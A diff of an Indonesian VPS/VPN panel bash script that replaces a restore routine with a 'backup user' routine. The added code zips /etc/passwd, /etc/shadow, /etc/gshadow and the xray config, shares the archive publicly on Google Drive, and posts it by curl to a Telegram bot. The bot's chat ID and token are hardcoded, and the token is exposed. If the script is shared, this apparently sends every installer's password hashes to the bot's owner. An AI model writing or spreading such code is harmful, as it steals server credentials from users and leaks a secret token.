@@ -10,52 +10,73 @@ BB='\033[0;36m'
 MB='\e[0;1m'
 CB='\e[35;1m'
 WB='\e[37;1m'
-domain=$(cat /etc/xray/domain)
-IP=$(wget -qO- ipinfo.io/ip)
+
+# Info Token
+TIMES="10"
+CHATID="5439907118"
+KEY="6079074982:AAG59dzsfG7nd8g7F_eLzdVab1_8nUfLCW8"
+URL="https://api.telegram.org/bot$KEY/sendDocument"
+
+# Info Domain
+domain=$(cat /etc/xray/domain) #Ganti directory Domain lu
+IP=$(wget -qO- ipinfo.io/ip);
 date=$(date +"%Y-%m-%d")
 time=$(date +'%H:%M:%S')
-# Restore User
-echo -e "$banner" | lolcat
-echo -e "$info"                                                                                                                                 echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
-echo -e "    ${WB}        ──── [ ʀᴇꜱᴛᴏʀᴇ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
+
+# Backup User
+clear
+echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
+echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜᴘ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
 echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
-echo -e ""
-read -p "     ʟɪɴᴋ ʙᴀᴄᴋᴜᴘ : " link
-if [[ $link == "" ]]; then
-echo ""
-echo -e "    ${RB} ʏᴏᴜ ᴘʀᴇꜱꜱᴇᴅ ᴡʀᴏɴɢ${NC}"
-menu
-fi
 sleep 1
-echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴛᴀʀᴛ ʀᴇꜱᴛᴏʀᴇ${NC}"
-# Create Restore Folder
-mkdir -p /root/.restore
-cd /root/.restore
-wget -q -O $IP-backup.zip "$link"
-unzip $IP-backup.zip > /dev/null 2>&1
-# Restore SSH
-cp -r /root/.restore/ssh/passwd /etc/passwd  &> /dev/null
-cp -r /root/.restore/ssh/group /etc/group  &> /dev/null
-cp -r /root/.restore/ssh/shadow /etc/shadow  &> /dev/null
-cp -r /root/.restore/ssh/gshadow /etc/gshadow  &> /dev/null
-# Restore Xray
-cp -r /root/.restore/xray/config.json /usr/local/etc/xray/config.json  &> /dev/null
+echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴛᴀʀᴛ ʙᴀᴄᴋᴜᴘ${NC}"
 
-# Restart Service
-systemctl restart ssh
-systemctl restart xray
-echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴜᴄᴄᴇꜱꜱ ʀᴇꜱᴛᴏʀᴇ${NC}"
+# Create Backup Folder
+rm -rf /root/.backup
+mkdir -p /root/.backup
+mkdir -p /root/.backup/ssh
+mkdir -p /root/.backup/xray
+
+# Backup SSH
+cp -r /etc/passwd /root/.backup/ssh/ &> /dev/null
+cp -r /etc/group /root/.backup/ssh/ &> /dev/null
+cp -r /etc/shadow /root/.backup/ssh/ &> /dev/null
+cp -r /etc/gshadow /root/.backup/ssh/ &> /dev/null
+
+# Backup Xray
+cp -r /etc/xray/config.json /root/.backup/xray/ &> /dev/null
+
+# Compress to zip
+cd /root/.backup
+zip -r $IP-backup.zip * > /dev/null 2>&1
+
+# Send To Google-Drive (WAJIB PUNYA SCRIPT UPLOAD GOOGLE DRIVE)
+id=$(gdrive upload $IP-backup.zip | grep Uploaded | awk '{print $2}')
+gdrive share $id > /dev/null 2>&1
+link="https://docs.google.com/uc?export=download&id=${id}"
+
+# Send To Bot Notif
+curl -F chat_id="$CHATID" -F document=@"$IP-backup.zip" -F caption="ᴛʜᴀɴᴋ ʏᴏᴜ ꜰᴏʀ ᴜꜱɪɴɢ ᴛʜɪꜱ ꜱᴄʀɪᴘᴛ
+ᴅᴏᴍᴀɪɴ : $domain
+ɪᴘ ᴠᴘꜱ : $IP
+ᴅᴀᴛᴇ   : $date
+ᴛɪᴍᴇ   : $time WIB
+ʟɪɴᴋ ɢᴏᴏɢʟᴇ : $link" $URL &> /dev/null
+echo -e "    ${GB} [ɪɴꜰᴏ] ꜱᴜᴄᴄᴇꜱꜱ ʙᴀᴄᴋᴜᴘ${NC}"
 sleep 1
 
+# Success Backup User
 clear
 cd
-rm -rf /root/.restore > /dev/null 2>&1
-echo -e "$banner" | lolcat
-echo -e "$info"
+rm -rf /root/.backup
 echo -e "    ${BB}┌───────────────────────────────────────┐${NC}" | lolcat
-echo -e "    ${WB}        ──── [ ʀᴇꜱᴛᴏʀ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
+echo -e "    ${WB}        ──── [ ʙᴀᴄᴋᴜᴘ ᴜꜱᴇʀ ] ────        ${NC}" | lolcat
 echo -e "    ${BB}└───────────────────────────────────────┘${NC}" | lolcat
-echo -e "    ${GB}           ꜱᴜᴄᴄᴇꜱꜱ ʀᴇꜱᴛᴏʀᴇᴅ ᴜꜱᴇʀ           ${NC}"
+echo -e "     ɪᴘ ᴠᴘꜱ       : $IP"
+echo -e "     ᴛᴀɴɢɢᴀʟ      : $date"
+echo -e "     ʟɪɴᴋ ʙᴀᴄᴋᴜᴘ  : $link"
+echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
+echo -e "    ${GB}        ᴘʟᴇᴀꜱᴇ ꜱᴀᴠᴇ ᴛʜᴇ ʟɪɴᴋ ᴀʙᴏᴠᴇ        ${NC}"
 echo -e "    ${BB} ────────────────────────────────────────${NC}" | lolcat
 echo -e ""
 read -n 1 -s -r -p "     ᴘʀᴇꜱꜱ ᴀɴʏ ᴋᴇʏ ᴛᴏ ʙᴀᴄᴋ ᴏɴ ᴍᴇɴᴜ"
